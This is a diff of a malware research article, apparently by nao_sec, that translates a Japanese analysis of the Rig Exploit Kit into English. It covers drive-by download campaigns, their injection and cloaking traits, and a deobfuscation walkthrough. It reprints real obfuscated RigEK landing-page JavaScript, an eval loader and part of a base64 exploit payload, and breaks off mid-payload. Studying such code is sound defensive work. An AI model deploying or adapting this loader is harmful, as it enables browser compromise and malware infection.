@@ -1,17 +1,14 @@
-# 初めての Rig Exploit Kit リーディング
-この記事は[@nao_sec](https://twitter.com/nao_sec)([@kkrnt](https://twitter.com/kkrnt), [@PINKSAWTOOTH](https://twitter.com/PINKSAWTOOTH))が2017-05-15に公開しました.  
-書かれている内容について, 著者は一切の責任を負いません.
+# Learning Rig Exploit Kit
+This article was published by [@nao_sec](https://twitter.com/nao_sec)([@kkrnt](https://twitter.com/kkrnt), [@PINKSAWTOOTH](https://twitter.com/PINKSAWTOOTH)) on May 15, 2017.  
+The author is not responsible for anything written.
 
-本記事は日本語で書かれています. 英語版は作成中です, 今しばらくお待ち下さい.
+※ There are very few Japanese documents about Drive-by Download Attack and Exploit Kit, and there is a shortage of information. I wrote [this document](https://github.com/nao-sec/RigEK/blob/master/README.md) to make up for it even a little. Because I translated Japanese documents in English, there may be sentences you do not understand when you read.
 
-## はじめに
-私がDrive-by Download攻撃について趣味で調べ始めてから3ヶ月が経ちました. それまでは攻撃の概要をぼんやりと知っていただけでしたが, 実際にpseudo-DarkleechやEITestなどのCampaignを追いかけ, 限定的なものではありますが, Drive-by Download攻撃の最前線を見ることが出来ました. 今回は私が今まで調査したことの中でも, 特に面白く, 私を熱中させてくれたRig Exploit Kitについて, 今私が知っている情報の一部をまとめます. 既知の内容が殆どであることは分かっていますが, 現在一般的な攻撃について一連の処理を追うこと, 日本語で書くことに意味があると考え, これを公開します. ここで紹介しなかった内容に関しては, 後日(他の機関とともに)別の形で公開されると思います. そちらは公開され次第ここにリンクを貼ろうと思います.
+## What is the Rig Exploit Kit?
+The Rig Exploit Kit (RigEK), is one of the Exploit Kit, which is the most currently available in Drive-by Download attack (DbD). DbD is an attack, that do some redirection (drive) to the malicious website prepared by the attacker or A general Web site where malicious code was injected by an attacker (Compromised site) , and finally malware download and install. An attacker's server sends exploit code that exploits vulnerabilities in browsers and other plugins. Those codes  drop and infect malware. Exploit Kit facilitates the flow of this attack. By using Exploit Kit, attackers can easily execute DbD without having expert knowledge and skills. RigEK suddenly from around September 2016 To increase the market share, and now has been used in many of DbD Campaign.
 
-## Rig Exploit Kitとは
-Rig Exploit Kit(RigEK)とは, 現在Drive-by Download攻撃(DbD)で最も利用されているExploit Kitの1つです. DbDとは, 攻撃者が用意したmaliciousなWebサイトや, 攻撃者によってmaliciousなコードがinjectされた一般のWebサイト(Compromisedサイト)へアクセスしたユーザに対して, 幾つかのリダイレクト(drive)を行い, 最終的にマルウェアをダウンロード・インストールさせる攻撃のことです. マルウェアをダウンロード・インストールさせるためにブラウザやその他プラグインの脆弱性を突くようなExploit Codeが攻撃者のサーバから送られ, そのコードによってマルウェアがdropし, 感染してしまいます. それらの攻撃の流れを容易に行うために作られているものがExploit Kitです. Exploit Kitを使うことで, 攻撃者は専門的な知識や技能を持たなくても, 容易にDbDを仕掛けることが出来ます. RigEKは2016年9月頃から急激にシェアを増やし, 現在では多くのDbD Campaignで利用されています.
-
-## RigEKを使用するCampaign
-RigEKを利用している（していた）Campaignは以下のようなものがあります.
+## Using RigEK Campaign
+Campaign using RigEK or used in the past is as follows.
 
 - pseudo-Darkleech
 - EITest
@@ -19,69 +16,69 @@ RigEKを利用している（していた）Campaignは以下のようなもの�
 - Decimal IP
 - Seamless
 
-これらの中でpseudo-DarkleechとEITestとGoodManは既に観測出来なくなっていて, 現在アクティブなのはDecimal IPとSeamlessです. 以下では, それぞれについて簡単に紹介します.
+Among these, pseudo-Darkleech, EITest and GoodMan are no longer observable, and currently Active is Decimal IP and Seamless, each of which is briefly introduced below.
 
 ### pseudo-Darkleech
-pseudo-Darkleechに関しては, Unit 42のBrad氏がとても素晴らしいドキュメントを書いてくれています. 詳細を知りたい人はそれを見て下さい.
+Regarding pseudo-Darkleech, Mr. Brad of Unit 42 has written a very wonderful document, so if you want to know more see it.
 
 [Campaign Evolution: pseudo-Darkleech in 2016](http://researchcenter.paloaltonetworks.com/2016/12/unit42-campaign-evolution-pseudo-darkleech-2016/)
 
-pseudo-DarkleechはCompromisedサイトに対して以下のようなコードをinjectし, RigEKへ誘導します.
+pseudo-Darkleech injects the following code to the Compromised site and leads it to RigEK.
 
 <img src='http://i.imgur.com/XZ0oTwq.jpg' width='60%'>
 
-とても大規模な攻撃Campaignで, 膨大な数のWebサイトが被害に合っていましたが, 2017年4月3日頃から一切観測出来なくなりました.
+Very large scale attack Campaign, a huge number of Web sites suffered damage, but since around April 3, 2017 we could not observe anything.
 
-特徴としては以下が挙げられます.
+The features are as follows.
 
-- injectされるコードはspanの間に, RigEKへ誘導するiframeが存在し, spanのtop値が大きなマイナス値
-- maliciousなコードがinjectされる位置はhtmlタグよりも前か, bodyタグの直前のどちらか
-- injectされるコードの末尾にnoscriptタグが存在するため, Compromisedサイトのコンテンツは正常に表示されない
-- Compromisedサイトは古いバージョンのCMSを使っていることが多い
-- 同一のIPでアクセスするとHTTP Status Code 500を返す
-- 同一のIPで多くのCompromisedサイトへアクセスすると, 改ざんされていない正常なページを返す
+- There is an iframe to guide injected code to RigEK during span, and the top value of span is a large negative value
+- The location where the malicious code is injected is either before the html tag or just before the body tag
+- Since the noscript tag exists at the end of the injected code, the content of the compromised site does not display properly
+- Compromised sites often use older versions of CMS
+- When accessing with the same IP, HTTP Status Code 500 is returned
+- Accessing many Compromised sites with the same IP returns normal pages that have not been tampered with
 
-pseudo-Darkleechのクローキングに関しては別途でドキュメントを書いているので, そちらを参照して下さい.
+As for the cloaking of pseudo-Darkleech, since I am separately writing the document, please refer to that.
 
 [pseudo-Darkleech_cloaking.md](https://github.com/koike/public/blob/master/2017/pseudo-Darkleech_cloaking.md)
 
 ### EITest
-EITestに関しても, Brad氏が素晴らしい記事を書いています. 是非そちらを参照して下さい.
+Regarding EITest, Mr. Brad wrote a wonderful article, so please refer to that.
 
 [Campaign Evolution: EITest from October through December 2016](http://researchcenter.paloaltonetworks.com/2017/01/unit42-campaign-evolution-eitest-october-december-2016/)
 
-EITestはCompromisedサイトに対して以下のようなコードをinjectし, RigEKへ誘導します.
+EITest injects the following code to the Compromised site and leads it to RigEK.
 
 <img src='http://i.imgur.com/kV6nyYZ.jpg' width='60%'>
 
-EITestはpseudo-Darkleechと同時期に活発化していたCampaignで, 日本からは観測出来ないことが殆どでしたが, pseudo-Darkleechと同じように多くのWebサイトが被害に合いました. しかし, EITestは4月28日以降観測されていません.
+EITest was Campaign, which was active at the same time as pseudo-Darkleech, most of what I could not observe from Japan, but as with pseudo-Darkleech many web sites suffered damage, but EITest Has not been observed since April 28th.
 
-特徴としては以下が挙げられます.
+The features are as follows.
 
-- injectされるコードは動的にiframeを生成するJavaScriptコードで, そのiframeによってRigEKへ誘導される
-- maliciousなコードはbodyタグの閉じタグ付近のinjectされる
-- ユーザのGeo情報をもとに攻撃する対象を限定している
-- 連続で同一IPを使ってアクセスすると正常なページを返す
+- The injected code is a JavaScript code that dynamically generates an iframe, which is directed to RigEK by the iframe
+- The malicious code is injected near the close tag of the body tag
+- Based on the Geo information of the user, the target to be attacked is limited
+- When accessing using the same IP continuously, normal pages are returned
 
 ### GoodMan
-GoodManは2017年3月から観測されるようになったCampaignで, 5月初旬にサーバがサスペンドされました. 私をGoodManをかなり早い段階から観測していて, 初期に発生していたコードミスから, 実際にどのようなコードがinjectされるのかを知っていました. GoodManに関してはmalwarebreakdownが最も詳しく, 彼の記事を参照することをオススメします.
+GoodMan is Campaign which was observed from March 2017. The server was suspended at the beginning of May.I was observing GoodMan from a very early stage and it was noticed from the code mistake that occurred earlier I knew exactly what code was injected.In respect to GoodMan malware breakdown is the most detailed and I recommend you to refer to his article.
 
 [Finding A ‘Good Man’](https://malwarebreakdown.com/2017/03/10/finding-a-good-man/)
 
 <img src='http://i.imgur.com/9O1Vh2o.jpg' width='60%'>
 
-GoodManはそれほど多くのCompromisedサイトが存在していたわけではありません. そのため私はあまり多くの情報を持っていませんが, 簡単に特徴を挙げます.
+GoodMan does not have so many Compromised sites, so I do not have much information, but I briefly list the features.
 
-- topとleftの値が-500pxのdivタグの中にiframeが存在するコードがCompromisedサイトにinjectされる
-- Compromisedサイトのコードがinjectされたコードで上書きされるので, 正常にコンテンツが表示されない
-- 常にRigEKへ繋がっているわけではない
+- A code in which an iframe exists is injected into the Compromised site in a div tag with top and left values of -500 px
+- Because the code of the compromised site is overwritten with the injected code, the contents are not displayed properly
+- Not always connected to RigEK
 
 ### Decimal IP
-Decimal IPは2017年3月末にMalwarebytesによって詳細が公開されました. 詳細はMalwarebytesの記事を参照して下さい.
+Details of Decimal IP were released by Malwarebytes at the end of March 2017. For details, please refer to the article of Malwarebytes.
 
 [Websites compromised in ‘Decimal IP’ campaign](https://blog.malwarebytes.com/cybercrime/2017/03/websites-compromised-decimal-ip-campaign/)
 
-これまで紹介したpseudo-DarkleechやEITestとは違い, iframeでリダイレクトせずに, HTTP Status Codeによってリダイレクトします. 動作原理自体は伝統的なDbDの手法ですが, Decimal IPを使うところが特徴です. 一般的に用いられているIPv4は10進数を4つ組み合わせて表現しますが, 他の表記方法もあります. それを利用しているのはこのCampaignで, 恐らくフィルタなどで検知されないようにすることが目的だと思われます.
+Unlike the pseudo-Darkleech and EITest which we introduced so far, we redirect with the HTTP Status Code without redirecting with iframe.Although the principle of operation is a traditional DbD method, it is characterized by using Decimal IP. Commonly used IPv4 expresses four combinations of decimal numbers, but there are other notation methods. It is using this Campaign that it is probably not to be detected by a filter etc. perhaps It seems to be the purpose.
 
 <img src='http://i.imgur.com/qYXpFqz.jpg' width='60%'>
 
@@ -89,62 +86,62 @@ Decimal IPは2017年3月末にMalwarebytesによって詳細が公開されま�
 
 <img src='http://i.imgur.com/h7Wplmv.jpg' width='60%'>
 
-特徴としては以下が挙げられます.
+The features are as follows.
 
-- 必ずリダイレクトされるわけではない
-- 複数のCompromisedサイトから同一のゲートへ到達する
-- IEでアクセスした場合と, Chromeでアクセスした場合で処理が分岐する
-- 同一IPで2度以上複数のCompromisedサイトへアクセスすることは出来ない
+- It is not necessarily redirected
+- Reach the same gate from multiple Compromised sites
+- Process branches when accessing with IE and accessing with Chrome
+- You can not access multiple Compromised sites more than once with the same IP
 
-IEでアクセスした場合は上記のような動作をしますが, Chromeでアクセスした場合はRigEKへ誘導せずに, Adobe Flash Playerのアップデートを模したサイトを用いてユーザにマルウェアを実行させようとします. それらの詳細については, 別途記事を書いているので, そちらを参照して下さい.
+When accessing with IE, it does the above operation, but when accessing with Chrome, it tries to let the user execute malware by using a site imitating the update of Adobe Flash Player without leading to RigEK For details about them, please see the separate article because you have written a separate article.
 
 [Overlooking Decimal IP Campaign](http://www.nao-sec.org/2017/05/overlooking-decimal-ip-campaign.html)
 
-ロジックが原始的で, かなり荒削りな部分が目立つCampaignで, Compromisedサイトの数はそれほど多くないと思われます.
+Campaign where logic is primitive and the part with considerably rough cut is conspicuous, it seems that the number of compromised sites is not so much.
 
 ### Seamless
-Seamlessは2017年2月頃から観測されていたと思いますが, 詳細な記事が出たのは3月末です. Cisco Umbrellaの記事がとても参考になるでしょう. 私はSeamlessを殆ど観測したことがないので, 詳細はその記事を参照して下さい.
+I think that Seamless had been observed since around February 2017. A detailed article came out at the end of March. The article of Cisco Umbrella will be very helpful.I have never observed Seamless For details, please refer to that article.
 
 [‘Seamless’ Campaign Delivers Ramnit via Rig EK](https://umbrella.cisco.com/blog/2017/03/29/seamless-campaign-delivers-ramnit-via-rig-ek/)
 
-## RigEKの挙動
-ここまででRigEKが様々なDbD Campaignで利用されていることが分かったでしょう. 次にCompromisedサイトからRigEKへリダイレクトしてきたユーザに対して, RigEKがどのような動きをするのか, 以下の図に説明します.
+## Behavior of RigEK
+So far we will see that RigEK is being used by various DbD Campaign. The following figure shows how RigEK moves to the user who redirected from Compromised site to RigEK I will explain.
 
 <img src='http://i.imgur.com/5UmaYpp.jpg' width='60%'>
 
-1. ユーザがCompromisedサイトへアクセスします
-2. CompromisedサイトにinjectされたコードによってRigEKへ繋がるURLを生成します
-3. CompromisedサイトはRigEKへ繋がるURLを含むデータをユーザへ返します
-4. ユーザは受け取ったデータに従ってRIgEKへ繋がるURLにアクセスします. RigEKはアクセスしてきたユーザの環境に合わせた(ブラウザやプラグインの脆弱性を突く）ペイロードを含む難読化されたデータをユーザに返します
-5. ユーザはペイロードによってマルウェアをダウンロードし, 実行します
+1. The user accesses the Compromised site
+2. Generate a URL that leads to RigEK by injected code into the Compromised site
+3. The Compromised site will return data to the user containing the URL that leads to RigEK
+4. The user accesses the URL that leads to RIgEK according to the received data RigEK gives the user the obfuscated data including the payload (which exploits vulnerabilities of browsers and plugins) according to the environment of the accessing user return
+5. The user downloads and executes the malware with the payload
 
-こうした流れによってユーザはWebサイトにアクセスしただけでマルウェアに感染します.
+This trend will allow users to infect malware just by accessing the website.
 
-具体的なDecimal IPにおけるトラフィックを以下に示します. 実際のpcapファイルは[こちら](decimalip_rig.pcap)にあるので, 詳細を見たい人は参照して下さい.
+The traffic in concrete Decimal IP is shown below.The actual pcap file is in [here](decimalip_rig.pcap), so please see the person who wants to see details.
 
 <img src='http://i.imgur.com/oDgtebf.jpg' width='60%'>
 
-まずユーザはCompromisedサイトへアクセスします. するとCompromisedサイトからはHTTP Status Code 302によってLocationへリダイレクトを行います.
+The user first accesses the Compromised site, and redirects to the location from the Compromised site by HTTP Status Code 302.
 
 <img src='http://i.imgur.com/ShVHaiE.jpg' width='60%'>
 
-リダイレクト先でも同じようにHTTP Status Code 302によってrig.phpというファイルへリダイレクトします.
+Redirect to the file rig.php by HTTP Status Code 302 in the redirect destination as well.
 
 <img src='http://i.imgur.com/2P1VnIl.jpg' width='60%'>
 
-rig.phpではRigEKへ誘導するURLに接続します.
+In rig.php, connect to the URL leading to RigEK.
 
 <img src='http://i.imgur.com/B4kdDrV.jpg' width='60%'>
 <img src='http://i.imgur.com/CfuQecJ.jpg' width='60%'>
 
-すると難読化されたJavaScriptを含むhtmlをブラウザが読み込み, 何らかの脆弱性を突くコードが走ることによってマルウェアがダウンロードされ, 実行されます.
+The browser will then load html containing obfuscated JavaScript and run code that exploits some vulnerability will cause malware to be downloaded and executed.
 
-## RigEKのファイル
-上記の説明で, RigEKのおおよその動きは理解出来たかと思います. RigEKへリダイレクトされるところまでは全く特に難しい部分もないですが, RigEKから送られてくる難読化されたコードが何をしているのか, 具体的に示します.
+## RigEK file
+In the explanation above, I think that I could understand the approximate movement of RigEK There is no particularly difficult part to be redirected to RigEK, but what does the obfuscated code sent from RigEK do It shows concretely whether it is.
 
-以下では私が以前書いた[Analyzing Rig Exploit Kit vol.1](http://www.nao-sec.org/2017/04/analyzing-rig-exploit-kit-vol1.html)のコードを参照します. 現在のRigEKのコードと違う部分も多少あるかもしれませんが, その部分は適宜読み替えて下さい.
+In the following, I refer to the code of [Analyzing Rig Exploit Kit vol.1](http://www.nao-sec.org/2017/04/analyzing-rig-exploit-kit-vol1.html) which I wrote earlier There may be some parts different from the code of the current RigEK, but please change part as appropriate.
 
-CompromisedサイトなどのiframeからRigEKへ誘導されると, まず以下のようなhtmlが返ってきます.
+When it is induced from an iframe such as Compromised site to RigEK, html like the following will be returned first.
 
 ```html
 <html><head>
@@ -168,7 +165,7 @@ ZHRCasQNsR=".<>=\"\')( \t\n";for(IalPxyaGkH='',plchazolpo=577,PxWHFBa
 ```
 [https://gist.github.com/anonymous/1911aeeb85b10cc76e8fcdf61633a6b5](https://gist.github.com/anonymous/1911aeeb85b10cc76e8fcdf61633a6b5)
 
-このhtmlは3つのJavaScriptセクションに分割することができ, それぞれ3行のJavaScriptコードで, 同一の復号ルーチンで難読化を解除することが出来ます. もっともコード量の少ない3つ目のセクションを例に, 難読化を解除してみます.
+This html can be broken up into three JavaScript sections, each with 3 lines of JavaScript code, you can break obfuscation with the same decryption routine.In the case of the third section with the smallest code amount as an example I will cancel obfuscation.
 
 ```js
 AGtqynEHtw="rnr�}r�a�fgd�r+�x�||�&26�aq�b�{�9-1�ea�2;�;b�c;aq�b�x]�ch�ed�/*f�{c�L;�0�for�i�h]�e[A�54e�{�4;i�0;i�fo�bstr�rAt�a��F/�D4�plac�f*/�/*df�9+/�34�yz�stuv�mno�hi�abc�54�VWXY�PQR�4F�SD�EFG��;va�leng�,L�rCo�fro�rin�df��0�c,�b�{},�;var�pOw�eG9�Xh5�iLCJ�pYW1�mN0�Mjk�Vp�CZ�xJVk�pnOU�XlX�wO�Hd�taD�1g4Y�9jU�l6�YUp�Lem�pZ�Ql�T1Y�NlbC�d3Rn�QU�IVDF�Q1p�F83�SzJ�V9PS�VNMd�RGT�FE�Y0p3�JR�16�bS�lyLm�Fu�hvYm�GU�ovL�HR0�Zib�IsIG�3Vu�0PX�pnJ�jd�5NU�OVpB�RS�Rp�ZH�i1xa�UFGM�l6b�wQ0R�2d�mN0�hLQ�E9�NT�lm�fJn�Z1d�VNr�xdnJ�lK�eUVv�0hf�0s�ViU�RF�ckVT�9QR0�NKd0�2UU1�E9�20v�5c�mlhb�ob�zaWR�dHA6�goI�peXR�IAo�k7C�Zk�Qo�2h�wZW�ZHku�Lm�ZW�WRvY�Ds�D0ga�IVE1�W5uZ�ZG�KCW�Yi�KCJk�tZ�GV�jcm�Vud�Bkb2�ZGc�yIG�Jd�0Pic�Jq�wv�Cs�rb�QgP�Wt�Jzs�dL�W5�0tP�dD�ia�8L�T4t�gIU�S1b�gJ�3Rk�gP�CWtv�+J�kaWZ�PCF�8IS�ArI�ga2�RkI�c7Cg�nIiA�Cs�gY�nI�Rx�PSJp�Zhb�XJz�2h�9R�5hb�Bhcm�yA�vd�CA9I�a29�nOw�WUiL�WU9I�dmF�Gxh�FtZT�YW0g�c8�Ar�a29�kID�gl�vPic�AnI�mdX�cg�WU�dm�pZS�lPSJ�SBu�XJ�CsgJ�Brb3�Qg�KCWt�MyI+�0PS�GVpZ�MyI�Ro�zIH�3Y�9Y�Y2N�3Jp�sb�Ig�ICs�Zn�InI�BkYX�sYX�XZlL�vY�L3g�2F0�wcGx�GU9I�0IH�2Jq�CArI�ga�b3R�Pic7�UVdP�tpZ�AnPC�GQ�Gt�CA�oJa2�4n�gJyI�YXNk�ZD0n�SJp�bHV�XJzI�hc�WU�tIG5�PHB�Qg�A9IG�a2�z4n�dWU�dWU9�gdm�he�ZT0�bm�yY�rICc�0Z�0ga�rb3�ic�nIi�MgK�Ky�WU9�dm�b3Zp�W1l�Jhb�Jz�RkIC�PSBr�Wtvd�Jzs�SIxM�2h�gaGV�oPSI�IHd�Wx3�Nlc�RB�3Jp�xsb3�CI�0M�U1M�LT�Nm�jZi�NmQ�lL�kY�mQ�c2�Q9I�YXN�WN0�2J�9I�90Z�2YXI�l7C�hc2�GZ1c�l0Z�4g�Y3Rp�goJZ�ZC�hm�Q0Mj�KnN�zK�TA�oZm�NjY2�jE0�yp�gYz�ZXR1�O3�ArP�IGQ�z0g�MqL2�Dd�ODE�pzZ�Mik�GUr�9kZU�jaGF�3KGF�aGp0�PS�IpO2�KG�9k�Fy�cC�3K�aGp0�PS�Kykg�IG�ZW5n�IGFw�ZS�gM�ciB�3IgK�z1nK�oYXB�iAmJ�5ndG�wcC5�tnO�cr�rdi�QWd�c2�XRvc�5hdm�Zit2�dit1�t2K�cH�3Zh�jI�yKDB�pLCB�nPWZ�jAp�KDB�CBmP�BkP�PSI�SIiL�ciB�O3�b2�UNo�cuZ�HJp�cj�Zhci�yk�dS�2Ym�vbiB�W5j�3O31�p0�ybiB�3Jld�p0NX�KyB�AiM�Q1cX�KWd�IHdp�0aC�lb�3L�0N�ICh�IHdo�gMC�ZHR�A/I�3aWR�CA9I�3aW�XZ�nQ1c�IGd�xK�HhGL�tICY�HIo�5zdW�DY�amd�IG�xdy�hqd�DQ7�j4�SBud�W0�Ht�weE�gP�Chu�doaW�Ep�weEY�W0gJ�0ci�LnN�2ZoN�0gZ2�NX�BnaG�MqL3�3ODM�OGh�Q2NT�5MDQ�svK�SAi�naGY�hnZ�dmFy�Zi�iY2�jc�DEyM�PS�2N�GpnZ�ci�L3�DkxZ�mhma�Nj�0Mm�nM2�RoKX�0sIH�dyhu�Z2hq�3Rp�vZn�Zmc�qMzI�2h�5M�jkz�Ly�var�ion�}fun�ch�}�tr�]b�efo�er�de[�re�0],�rip�]�agN�nt�tE�c[�a�tex�t,�as�/j�t�typ��scr�ment�at�[c�}v,�cu�*/�j16�69�09�/*s�,c�var�n�ct"./*glkhj*/split('�');
@@ -177,7 +174,7 @@ ZHRCasQNsR=".<>=\"\')( \t\n";for(IalPxyaGkH='',plchazolpo=577,PxWHFBa
 ```
 [https://gist.github.com/anonymous/ded41ab808e19110d449046fe8af0850](https://gist.github.com/anonymous/ded41ab808e19110d449046fe8af0850)
 
-このコードを読みやすく整形すると以下のようになります.
+If you format this code for readability, it looks like the following.
 
 ```js
 string_A = ["rnr", "}r", "a", "fgd", "r+", "x", "||", "&26", "aq", "b", "{", "9-1", "ea", "2;", ";b", "c;aq", "b", "x]", "ch", "ed", "/*f", "{c", "L;", "0", "for", "i", "h]", "e[A", "54e", "{", "4;i", "0;i", "fo", "bstr", "rAt", "a", "", "F/", "D4", "plac", "f*/", "/*df", "9+/", "34", "yz", "stuv", "mno", "hi", "abc", "54", "VWXY", "PQR", "4F", "SD", "EFG", "", ";va", "leng", ",L", "rCo", "fro", "rin", "df", "", "0", "c,", "b", "{},", ";var", "pOw", "eG9", "Xh5", "iLCJ", "pYW1", "mN0", "Mjk", "Vp", "CZ", "xJVk", "pnOU", "XlX", "wO", "Hd", "taD", "1g4Y", "9jU", "l6", "YUp", "Lem", "pZ", "Ql", "T1Y", "NlbC", "d3Rn", "QU", "IVDF", "Q1p", "F83", "SzJ", "V9PS", "VNMd", "RGT", "FE", "Y0p3", "JR", "16", "bS", "lyLm", "Fu", "hvYm", "GU", "ovL", "HR0", "Zib", "IsIG", "3Vu", "0PX", "pnJ", "jd", "5NU", "OVpB", "RS", "Rp", "ZH", "i1xa", "UFGM", "l6b", "wQ0R", "2d", "mN0", "hLQ", "E9", "NT", "lm", "fJn", "Z1d", "VNr", "xdnJ", "lK", "eUVv", "0hf", "0s", "ViU", "RF", "ckVT", "9QR0", "NKd0", "2UU1", "E9", "20v", "5c", "mlhb", "ob", "zaWR", "dHA6", "goI", "peXR", "IAo", "k7C", "Zk", "Qo", "2h", "wZW", "ZHku", "Lm", "ZW", "WRvY", "Ds", "D0ga", "IVE1", "W5uZ", "ZG", "KCW", "Yi", "KCJk", "tZ", "GV", "jcm", "Vud", "Bkb2", "ZGc", "yIG", "Jd", "0Pic", "Jq", "wv", "Cs", "rb", "QgP", "Wt", "Jzs", "dL", "W5", "0tP", "dD", "ia", "8L", "T4t", "gIU", "S1b", "gJ", "3Rk", "gP", "CWtv", "+J", "kaWZ", "PCF", "8IS", "ArI", "ga2", "RkI", "c7Cg", "nIiA", "Cs", "gY", "nI", "Rx", "PSJp", "Zhb", "XJz", "2h", "9R", "5hb", "Bhcm", "yA", "vd", "CA9I", "a29", "nOw", "WUiL", "WU9I", "dmF", "Gxh", "FtZT", "YW0g", "c8", "Ar", "a29", "kID", "gl", "vPic", "AnI", "mdX", "cg", "WU", "dm", "pZS", "lPSJ", "SBu", "XJ", "CsgJ", "Brb3", "Qg", "KCWt", "MyI+", "0PS", "GVpZ", "MyI", "Ro", "zIH", "3Y", "9Y", "Y2N", "3Jp", "sb", "Ig", "ICs", "Zn", "InI", "BkYX", "sYX", "XZlL", "vY", "L3g", "2F0", "wcGx", "GU9I", "0IH", "2Jq", "CArI", "ga", "b3R", "Pic7", "UVdP", "tpZ", "AnPC", "GQ", "Gt", "CA", "oJa2", "4n", "gJyI", "YXNk", "ZD0n", "SJp", "bHV", "XJzI", "hc", "WU", "tIG5", "PHB", "Qg", "A9IG", "a2", "z4n", "dWU", "dWU9", "gdm", "he", "ZT0", "bm", "yY", "rICc", "0Z", "0ga", "rb3", "ic", "nIi", "MgK", "Ky", "WU9", "dm", "b3Zp", "W1l", "Jhb", "Jz", "RkIC", "PSBr", "Wtvd", "Jzs", "SIxM", "2h", "gaGV", "oPSI", "IHd", "Wx3", "Nlc", "RB", "3Jp", "xsb3", "CI", "0M", "U1M", "LT", "Nm", "jZi", "NmQ", "lL", "kY", "mQ", "c2", "Q9I", "YXN", "WN0", "2J", "9I", "90Z", "2YXI", "l7C", "hc2", "GZ1c", "l0Z", "4g", "Y3Rp", "goJZ", "ZC", "hm", "Q0Mj", "KnN", "zK", "TA", "oZm", "NjY2", "jE0", "yp", "gYz", "ZXR1", "O3", "ArP", "IGQ", "z0g", "MqL2", "Dd", "ODE", "pzZ", "Mik", "GUr", "9kZU", "jaGF", "3KGF", "aGp0", "PS", "IpO2", "KG", "9k", "Fy", "cC", "3K", "aGp0", "PS", "Kykg", "IG", "ZW5n", "IGFw", "ZS", "gM", "ciB", "3IgK", "z1nK", "oYXB", "iAmJ", "5ndG", "wcC5", "tnO", "cr", "rdi", "QWd", "c2", "XRvc", "5hdm", "Zit2", "dit1", "t2K", "cH", "3Zh", "jI", "yKDB", "pLCB", "nPWZ", "jAp", "KDB", "CBmP", "BkP", "PSI", "SIiL", "ciB", "O3", "b2", "UNo", "cuZ", "HJp", "cj", "Zhci", "yk", "dS", "2Ym", "vbiB", "W5j", "3O31", "p0", "ybiB", "3Jld", "p0NX", "KyB", "AiM", "Q1cX", "KWd", "IHdp", "0aC", "lb", "3L", "0N", "ICh", "IHdo", "gMC", "ZHR", "A/I", "3aWR", "CA9I", "3aW", "XZ", "nQ1c", "IGd", "xK", "HhGL", "tICY", "HIo", "5zdW", "DY", "amd", "IG", "xdy", "hqd", "DQ7", "j4", "SBud", "W0", "Ht", "weE", "gP", "Chu", "doaW", "Ep", "weEY", "W0gJ", "0ci", "LnN", "2ZoN", "0gZ2", "NX", "BnaG", "MqL3", "3ODM", "OGh", "Q2NT", "5MDQ", "svK", "SAi", "naGY", "hnZ", "dmFy", "Zi", "iY2", "jc", "DEyM", "PS", "2N", "GpnZ", "ci", "L3", "DkxZ", "mhma", "Nj", "0Mm", "nM2", "RoKX", "0sIH", "dyhu", "Z2hq", "3Rp", "vZn", "Zmc", "qMzI", "2h", "5M", "jkz", "Ly", "var", "ion", "}fun", "ch", "}", "tr", "]b", "efo", "er", "de[", "re", "0],", "rip", "]", "agN", "nt", "tE", "c[", "a", "tex", "t,", "as", "/j", "t", "typ", "", "scr", "ment", "at", "[c", "}v,", "cu", "*/", "j16", "69", "09", "/*s", ",c", "var", "n", "ct"];
@@ -201,14 +198,15 @@ eval(code);
 ```
 [https://gist.github.com/anonymous/d4603c14265cc0ad524d7ead73988e9a](https://gist.github.com/anonymous/d4603c14265cc0ad524d7ead73988e9a)
 
-単純に2つに分割されたJavaScriptコードをつなぎ合わせ, evalで実行しているだけです. 実行されているコードは以下のようになります.
+Just simply split the two split JavaScript code and just execute it with eval The code being executed is as follows.
+
 
 ```js
 function k(){var a=l(),c={v:/*s58090d46920hfj1608fs*/document}.v, b=c["createElement"]("script");b["type"]="text/javascript",b["text"]=a,a=c["getElementsByTagName"]("script")[0],a.parentNode["insertBefore"](b,a)}try{k()}catch(m){}function l(){var s = "LypzNjkzNGQ5MTI0M2hzc2ZqMzI5NDZmcyovZnVuY3Rpb24gZ2hqdDVxdyhudW0sIHdpZHRoKXsvKnM2MzQ0MmQyNjU2MmhmajkzMDkxZnMqL3ZhciBnaGpnZmg2NTQgPSAiMDEyMzQ1Njc4OWFiY2RlZiI7dmFyIGhnZmdnaGYgPSAiIjsvKnM5MDQzOWQ2NTM5OGhmajQ3ODMxZnMqL3ZhciBnaGp0NXF3ID0gZ2hqZ2ZoNjU0LnN1YnN0cihudW0gJiAweEYsIDEpO3doaWxlIChudW0gPiAweEYpIHtudW0gPSBudW0gPj4+IDQ7Z2hqdDVxdyA9IGdoamdmaDY1NC5zdWJzdHIobnVtICYgMHhGLCAxKSArIGdoanQ1cXc7fXZhciB3aWR0aCA9ICh3aWR0aCA/IHdpZHRoIDogMCk7IHdoaWxlIChnaGp0NXF3Lmxlbmd0aCA8IHdpZHRoKWdoanQ1cXcgPSAiMCIgKyBnaGp0NXF3O3JldHVybiBnaGp0NXF3O31mdW5jdGlvbiBnaG52Ym4odSwgaykge3ZhciBmcj1TdHJpbmcuZnJvbUNoYXJDb2RlO3ZhciBjPSIiLCBiPSIiLCBkPSIiLCBmPWZyKDB4MjApLCBnPWZyKDApLCB2PWZyKDB4MjIpO3ZhciBhcHA9ayt2K2Yrdit1K3YrZit2K25hdmlnYXRvci51c2VyQWdlbnQrditnK2crZytnO2FwcC5sZW5ndGglMiAmJiAoYXBwKz1nKTtmb3IgKHZhciBlID0gMDsgZSA8IGFwcC5sZW5ndGg7IGUrKykge2IgPSBnaGp0NXF3KGFwcC5jaGFyQ29kZUF0KGUpLDIpO2QgPSBnaGp0NXF3KGFwcC5jaGFyQ29kZUF0KGUrMSksMik7LypzZGhkODEwODdoZnMqL2MgKz0gYiArIGQ7ZSArPSAxO31yZXR1cm4gYzt9LypzNjE0ODlkNjY2OTVoZmo4MTA0NGZzKi8vKnNkaGQ0MjU1OWhmc2ZmZCovCgoJZnVuY3Rpb24gaXl0ZmdoKGZ1cyxhc2QpCgl7Cgl2YXIga290ZCA9ICc8b2JqZWN0IGNsYXNzaWQ9ImNsc2lkOmQyN2NkYjZlLWFlNmQtMTFjZi05NmI4LTQ0NDU1MzU0MDAwMCIgYWxsb3dTY3JpcHRBY2Nlc3M9YWx3YXlzIHdpZHRoPSIxMyIgaGVpZ2h0PSIxMyI+JzsKCWtvdGQgPSBrb3RkICsgJzxwYXJhbSBuYW1lPSJtb3ZpZSIgdmFsdWU9IicgKyBmdXMgKyAnIiAvPic7Cglrb3RkID0ga290ZCArICc8cGFyYW0gbmFtZT0icGxheSI